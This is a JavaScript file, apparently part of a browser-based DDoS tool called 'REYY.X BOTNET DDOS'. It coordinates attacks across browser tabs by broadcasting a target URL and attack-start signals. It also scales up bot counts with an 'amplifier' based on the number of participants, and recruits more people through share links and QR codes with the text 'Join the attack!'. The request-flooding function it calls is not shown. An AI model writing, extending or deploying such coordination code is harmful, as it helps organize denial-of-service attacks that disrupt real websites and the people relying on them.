// ============================================
// 🔥 REYY.X - SHARE LINK & AMPLIFIER ENGINE
// ============================================

const STORAGE_KEYS = { VISITOR_ID: 'reyyx_visitor_id', TARGET: 'reyyx_target' };

function getVisitorId() {
    let id = localStorage.getItem(STORAGE_KEYS.VISITOR_ID);
    if (!id) {
        id = 'V_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        localStorage.setItem(STORAGE_KEYS.VISITOR_ID, id);
    }
    return id;
}

class AttackCoordinator {
    constructor() {
        this.visitorId = getVisitorId();
        this.activeAttackers = new Set();
        this.channel = new BroadcastChannel('reyyx_attack_channel');
        this.setupChannel();
        this.activeAttackers.add(this.visitorId);
        this.startHeartbeat();
        this.updateUI();
    }
    
    setupChannel() {
        this.channel.onmessage = (event) => {
            const data = event.data;
            switch(data.type) {
                case 'HEARTBEAT':
                    this.activeAttackers.add(data.visitorId);
                    this.updateUI();
                    break;
                case 'ATTACK_START':
                    if (data.target && typeof window.deployBotnet === 'function' && !window.isAttacking) {
                        document.getElementById('targetUrl').value = data.target;
                        setTimeout(() => window.deployBotnet(), 500);
                    }
                    break;
                case 'SYNC_TARGET':
                    if (data.target) document.getElementById('targetUrl').value = data.target;
                    break;
                case 'LEAVE':
                    this.activeAttackers.delete(data.visitorId);
                    this.updateUI();
                    break;
            }
        };
    }
    
    startHeartbeat() {
        setInterval(() => {
            this.channel.postMessage({ type: 'HEARTBEAT', visitorId: this.visitorId, timestamp: Date.now() });
            localStorage.setItem('reyyx_attackers', JSON.stringify(Array.from(this.activeAttackers)));
        }, 5000);
    }
    
    broadcastTarget(target) { this.channel.postMessage({ type: 'SYNC_TARGET', target: target, visitorId: this.visitorId }); }
    broadcastAttackStart(target) { this.channel.postMessage({ type: 'ATTACK_START', target: target, visitorId: this.visitorId }); }
    broadcastLeave() { this.channel.postMessage({ type: 'LEAVE', visitorId: this.visitorId }); }
    
    getTotalAttackers() { return this.activeAttackers.size; }
    
    getAmplifierBonus() {
        const attackers = this.getTotalAttackers();
        if (attackers <= 1) return 1;
        if (attackers <= 3) return 2;
        if (attackers <= 6) return 5;
        if (attackers <= 10) return 10;
        if (attackers <= 20) return 25;
        return 50;
    }
    
    updateUI() {
        const total = this.getTotalAttackers();
        const bonus = this.getAmplifierBonus();
        document.getElementById('totalAttackers') && (document.getElementById('totalAttackers').textContent = total);
        document.getElementById('amplifierBonus') && (document.getElementById('amplifierBonus').textContent = `${bonus}x`);
        document.getElementById('collabCount') && (document.getElementById('collabCount').textContent = total);
        document.getElementById('visitorCount') && (document.getElementById('visitorCount').innerHTML = `👥 TOTAL ATTACKERS: ${total}`);
        document.getElementById('botCounter') && (document.getElementById('botCounter').innerHTML = `🤖 BOTS: ${document.getElementById('activeBots')?.innerText || 0} | 👥 ATTACKERS: ${total}`);
        
        const currentRPS = parseInt(document.getElementById('requestsPerSec')?.innerText || 0);
        document.getElementById('estimatedRPS') && (document.getElementById('estimatedRPS').textContent = (currentRPS * bonus).toLocaleString());
    }
}

const coordinator = new AttackCoordinator();

function setupShareLink() {
    const currentUrl = window.location.href;
    const shareUrlInput = document.getElementById('shareUrl');
    if (shareUrlInput) shareUrlInput.value = currentUrl;
    
    const copyBtn = document.getElementById('copyLinkBtn');
    if (copyBtn) {
        copyBtn.addEventListener('click', () => {
            navigator.clipboard.writeText(currentUrl);
            const original = copyBtn.innerText;
            copyBtn.innerText = '✅ COPIED!';
            setTimeout(() => copyBtn.innerText = original, 2000);
        });
    }
    
    if (document.getElementById('shareBtn') && navigator.share) {
        document.getElementById('shareBtn').addEventListener('click', () => {
            navigator.share({ title: 'REYY.X BOTNET DDOS', text: 'Join the attack!', url: currentUrl });
        });
    }
    
    if (typeof QRCode !== 'undefined' && document.getElementById('qrCode')) {
        new QRCode(document.getElementById('qrCode'), { text: currentUrl, width: 100, height: 100, colorDark: '#ff3300', colorLight: '#000000' });
    }
}

const originalDeploy = window.deployBotnet;
window.deployBotnet = async function() {
    const target = document.getElementById('targetUrl')?.value.trim();
    if (target) { coordinator.broadcastAttackStart(target); coordinator.broadcastTarget(target); }
    if (originalDeploy) await originalDeploy();
    const bonus = coordinator.getAmplifierBonus();
    const botCountInput = document.getElementById('botCount');
    if (botCountInput) {
        const originalCount = parseInt(botCountInput.value);
        botCountInput.value = Math.min(originalCount * bonus, 300);
    }
};

window.addEventListener('beforeunload', () => coordinator.broadcastLeave());
document.addEventListener('DOMContentLoaded', setupShareLink);

window.getTotalAttackers = () => coordinator.getTotalAttackers();
window.getAmplifierBonus = () => coordinator.getAmplifierBonus();